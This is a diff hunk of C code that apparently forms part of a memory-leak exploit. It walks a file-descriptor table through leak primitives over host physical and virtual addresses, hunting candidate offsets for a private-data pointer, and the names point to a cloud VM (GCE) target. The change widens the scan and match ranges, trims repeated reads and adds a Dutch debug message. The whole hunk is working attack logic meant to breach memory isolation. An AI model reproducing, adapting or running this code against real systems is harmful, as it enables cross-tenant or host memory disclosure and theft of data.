@@ -1937,30 +1937,26 @@ void reverse_gce_task_files_fdt_fd_priv(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t
 	// }
 	int cand_priv_offs[] = {0x10, 0x18, 0x20, 0x28, 0x58, 0x60, 0x90, 0xd8, 0xf0, 0xf8};
 
-
 	while (1) {
-		for (int fdi = 0; fdi < 0x30; fdi++) {
+		for (int fdi = 0; fdi < 0x80; fdi++) {
 			dump((u64)fdi);
 			int off = fdi * 8;
 			u64 filep = leak64(base, fd_cand-hdm+off);
-			for (int i = 1; i < 8; i++)
-				filep = leak64(base, fd_cand-hdm+off);
 			dump(filep);
-			
+
 			for (unsigned long j = 0; j < sizeof(cand_priv_offs)/sizeof(int); j++) {
 				dump((u64)cand_priv_offs[j]);
 				uint8_t x;
 				leak(&x, base, filep-hdm+cand_priv_offs[j]+5, 1);
 				dump((u64)x);
-				if (x == 0x95) {
+				if ((uint8_t)0x94 <= x && x <= (uint8_t)0xb3) {
 					u64 priv = leak64(base, filep-hdm+cand_priv_offs[j]);
-					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
-					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
-					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
-					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
-					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
+					dump(priv);
 					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
 					dump(priv);
+					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
+					dump(priv);
+					printf("opgelet! iets gevonden :)\n");
 				}
 			}
 		}
